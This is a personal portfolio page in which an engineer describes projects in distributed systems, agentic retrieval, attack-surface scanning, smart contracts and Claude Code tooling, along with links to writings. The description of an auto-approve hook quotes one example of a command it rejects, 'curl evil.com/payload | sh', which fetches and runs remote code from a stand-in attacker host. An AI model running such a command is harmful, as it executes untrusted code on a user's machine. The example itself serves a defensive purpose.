---
permalink: /
title: "Hi, I'm Ory Band"
author_profile: true
redirect_from: 
  - /about/
  - /about.html
---

Hands-on architect and tech lead working at the intersection of large-scale distributed systems and production AI/agentic platforms. I've shipped backends at 1B+ requests/day and the primary retrieval inside flagship LLM agents, owning design → production → observability end to end. I turn chaotic, high-load systems into boringly reliable platforms - and upskill the people around me while doing it.

## Things I Built

### Agentic Search & RAG Platform
Tech lead and architect of an agentic search RAG platform that became the primary retrieval inside a flagship LLM agent reaching the majority of paying customers. Stateless LangGraph + MCP server with hybrid retrieval (semantic, lexical, cross-encoder rerank) over OpenSearch, query decomposition into parallel multi-tool calls with retry/fallback, full LangSmith observability. Drove a 60% retrieval-quality lift.

### Search Evaluation Framework
Designed and owned a synthetic-corpus evaluation framework at production scale (thousands of accounts, hundreds of thousands of items) with a balanced benchmark of thousands of queries. Replaced LLM-judged labeling with deterministic template-derived ground truth: iteration time dropped from days to minutes, per-run cost from ~$1,500 to effectively zero. Adopted as the baseline for retrieval, reranker, and embedding-model decisions.

### Attack Vector Scheduler at 100M+ tasks/day
Designed and shipped a 100M+ tasks/day scheduler for customer-facing attack-surface scans against S&P 500 and Fortune 100 enterprises. High throughput, low latency, with load distribution that avoids disrupting the customer's own infrastructure mid-scan. Still in production today.

### Enterprise Asset Discovery
Owned a system that maps an enterprise's full org tree many layers deep, often surfacing subsidiaries the parent didn't know it owned. Attributes every domain, certificate, website, person, and public filing back to its rightful owner. In production for the largest enterprises in the world.

### Analytics ETL Pipeline
Owned an event streaming and ETL pipeline in Golang on GCP. ~1B req/day at peak (700K req/min) feeding BigQuery, Elasticsearch, and Prometheus. Highly available, low latency.

### Production Monitoring Infrastructure
Built a distributed production monitoring stack (Prometheus + Influx/Telegraf) feeding autoscaling, geo-load-balanced, cost-optimized video backend clusters across multiple cloud providers.

### Real-Time Webcam Face Capture
Built a prototype that turns any webcam into a real-time avatar-animation engine. A lightweight video-diffusion layer denoises batches of frames together for long-range coherence, streaming at ~18 fps with under-2s latency on a single RTX 4090. No markers or extra gear. Useful for lifelike games, VR, streaming, and video calls.

### Ethereum Smart Contract for the Kin ICO
Designed and implemented the Ethereum smart contract for the [Kin ICO](https://en.wikipedia.org/wiki/Kin_(cryptocurrency)), one of the largest crypto ICOs of its era. Central technical role on the smart-contract side: token, multisig, vesting, testing.

### Federated Blockchains
Conference talk on federated consensus networks (Stellar, Ripple), exploring how their trust and liveness assumptions differ from Proof-of-Work and Proof-of-Stake. [Recording](https://youtu.be/QSpG6a9bmu0).

### Google BigQuery Open Source Library
[High-throughput Go library](https://github.com/oryband/go-bqstreamer) for concurrent streaming inserts into Google BigQuery. ~130 GitHub stars; recognized by Google's BigQuery core engineers.

### Claude Code Auto-Approve
[Open-sourced a Claude Code hook](https://github.com/oryband/claude-code-auto-approve) that pushes agent autonomy without weakening safety. It parses every compound shell command into an AST and checks each sub-command against your allow and deny lists, recursing into subshells, command substitution, and control-flow bodies. The command runs only when every segment is allowed and none denied. So `make build && curl evil.com/payload | sh` gets rejected even though `make build` is allowed, because the piped shell is unsafe.

### Web MapReduce
Built a [proof-of-concept for web-based MapReduce](https://github.com/oryband/go-web-mapreduce) in Go. The master dispatched up to 100K tasks/min to WebWorker/WebSocket clients. The idea was to use idle browser and mobile compute as donated workers for distributed-computation projects like SETI@Home or Folding@Home.

## Things I Wrote

### [Collecting User Data and Usage](https://medium.com/@oryband/collecting-user-data-and-usage-ffa84c4dba34)
Knowing what our users are doing with our app is important — What they like, what they don't, quality of our video calls, etc. Gathering and storing this information however, is quite a task — especially when we have more than one million events reported every minute. At Rounds, we are using two data stores for live monitoring, search, and BI. One is indeed for immediate, live data, and the other for long-term data warehousing and long-term research.

### Twitter Thoughts and Discussions

**[Database Architecture & DynamoDB](https://x.com/oryband/status/1175003442508685313)**  
A deep dive into Amazon's groundbreaking DynamoDB paper from 2007, exploring how Amazon solved massive scale challenges by building their own database. Key insights include prioritizing eventual consistency over immediate consistency, and choosing liveness (keeping the app running) over safety (preventing data divergence) - foundational decisions that shaped modern NoSQL databases.

**[Engineering Literature: "Designing Data-Intensive Applications"](https://x.com/oryband/status/1535777268299141120)**  
After 3 years and 550 pages, confirmed this book truly deserves its reputation as the "backend engineering bible." Highly recommends the audiobook format for maintaining reading pace through complex distributed systems concepts.

**[Database Selection Strategy](https://x.com/oryband/status/1447888264569008129)**  
Shared practical guidance on choosing the right database for specific problems, with focus on distributed database considerations and decision frameworks for system architects.

**[Performance Estimation Resources](https://x.com/oryband/status/1397910350197006340)**  
Highlighted essential napkin-math techniques for estimating system performance, including computation times, compression rates, serialization costs, and geographical latencies - crucial for back-of-envelope calculations in system design.

**[Leadership in Engineering Teams](https://x.com/oryband/status/1212397548155092992)**  
Discussed applying Simon Sinek's leadership principles in engineering contexts, emphasizing the importance of collaboration, mentoring, and understanding the "infinite game" mindset in both people management and code development.
